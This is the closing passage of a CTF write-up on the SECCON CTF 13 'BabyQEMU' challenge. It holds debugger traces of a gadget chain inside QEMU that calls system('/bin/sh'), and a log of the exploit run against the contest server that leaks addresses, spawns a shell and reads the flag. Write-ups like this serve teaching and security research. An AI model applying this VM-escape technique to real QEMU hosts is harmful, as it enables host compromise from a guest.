   0x555555ac9a07                  mov    edx, ebx
   0x555555ac9a09                  mov    esi, 0x1
●→ 0x555555ac9a0e                  mov    rdi, QWORD PTR [rax+0x10]
   0x555555ac9a12                  call   QWORD PTR [rax]
   0x555555ac9a14                  test   rbp, rbp
   0x555555ac9a17                  jne    0x555555ac9a00
   0x555555ac9a19                  mov    rax, QWORD PTR [rsp+0x18]
   0x555555ac9a1e                  sub    rax, QWORD PTR fs:0x28

ef➤  x/30gx $rax+0x10
0x5555580b2948:	0x00005555580b2950	0x0068732f6e69622f &lt;= address to /bin/sh / bin/sh
0x5555580b2958:	0x0000000000000000	0x0000000000000000
0x5555580b2968:	0x0000000000000000	0x0000555555ac9a0e

gef➤  x/s 0x00005555580b2950
0x5555580b2950:	"/bin/sh"

gef➤  x/gx $rax
0x5555580b2938:	0x00005555558b35d5  &lt;= next gadget</code></pre></figure>

<p>Calling the next gadget will result in</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555580b2938  →  0x00005555558b35d5  →   call QWORD PTR [rax+0x8]
$rbx   : 0x00005555572d1f80  →  0x00005555570a35b0  →  0x0000555556ffaed0  →  0x0000555556ffb050  →  "memory-region"
$rcx   : 0x1               
$rdx   : 0x4               
$rsp   : 0x00007ffff55fec90  →  0x0000555555ac9a14  →   test rbp, rbp
$rbp   : 0x4               
$rsi   : 0x1004            
$rdi   : 0x00005555580b2950  →  0x0068732f6e69622f ("/bin/sh"?)
$rip   : 0x00005555558b35d5  →   call QWORD PTR [rax+0x8]
$r8    : 0x1               
$r9    : 0x0000555555ac9a0e  →   mov rdi, QWORD PTR [rax+0x10]
$r10   : 0x0               
$r11   : 0x0               
$r12   : 0x1004            
$r13   : 0x1               
$r14   : 0x1               
$r15   : 0x2               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555558b35c2                  mov    rax, QWORD PTR [rdi+0x18]
   0x5555558b35c6                  mov    DWORD PTR [rsp+0x4], 0x30
   0x5555558b35ce                  mov    rax, QWORD PTR [rax+0x1c70]
 → 0x5555558b35d5                  call   QWORD PTR [rax+0x8]
   0x5555558b35d8                  mov    rdx, QWORD PTR [rsp+0x18]
   0x5555558b35dd                  sub    rdx, QWORD PTR fs:0x28
   0x5555558b35e6                  jne    0x5555558b35fe
   0x5555558b35e8                  add    rsp, 0xd8
   0x5555558b35ef                  xor    edx, edx

gef➤  x/gx $rax+0x8
0x5555580b2940:	0x0000555555878150

gef➤  x/3i 0x0000555555878150
   0x555555878150 &lt;system@plt&gt;:	endbr64
   0x555555878154 &lt;system@plt+4&gt;:	jmp    QWORD PTR [rip+0x15bebde]        # 0x555556e36d38 &lt;system@got.plt&gt;
   0x55555587815a &lt;system@plt+10&gt;:	nop    WORD PTR [rax+rax*1+0x0]</code></pre></figure>

<p>So <code class="language-plaintext highlighter-rouge">rdi</code> pointing to <code class="language-plaintext highlighter-rouge">/bin/sh</code>, stack aligned, ready to execute <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.</p>

<p>And running it remote…</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">PWNLIB_NOTERM=1 python3 xpl.py 1
[*] Compile
[x] Opening connection to babyqemu.seccon.games on port 3824
[x] Opening connection to babyqemu.seccon.games on port 3824: Trying 153.127.217.94
[+] Opening connection to babyqemu.seccon.games on port 3824: Done
[x] Starting local process './pow.sh'
[+] Starting local process './pow.sh': pid 536395
[*] Switching to interactive mode
# ./pwn

HEAP leak     : 0x55f174b098d0
QEMU leak     : 0x55f1599d94a0
QEMU base     : 0x55f159225000
opaque        : 0x55f174b0a9d0
mmio_ptr      : 0x55f173d0af60
target_off    : 0xdffa20
sh: turning off NDELAY mode
ls
bzImage
flag-3d88515f1a04703466da6ca63c4df592.txt
pow.sh
qemu-system-x86_64
roms
rootfs.cpio.gz
run.sh
cat flag*
SECCON{q3mu_35c4p3_15_34513r_7h4n_y0u_7h1nk}</code></pre></figure>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=SECCON CTF 13 Quals - BabyQEMU&amp;url=https://kileak.github.io/ctf/2024/seccon13quals-babyqemu/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2024/seccon13quals-babyqemu/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2024/seccon13quals-babyqemu';
        var disqus_title = 'SECCON CTF 13 Quals - BabyQEMU';
        var disqus_url = 'https://kileak.github.io/ctf/2024/seccon13quals-babyqemu';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
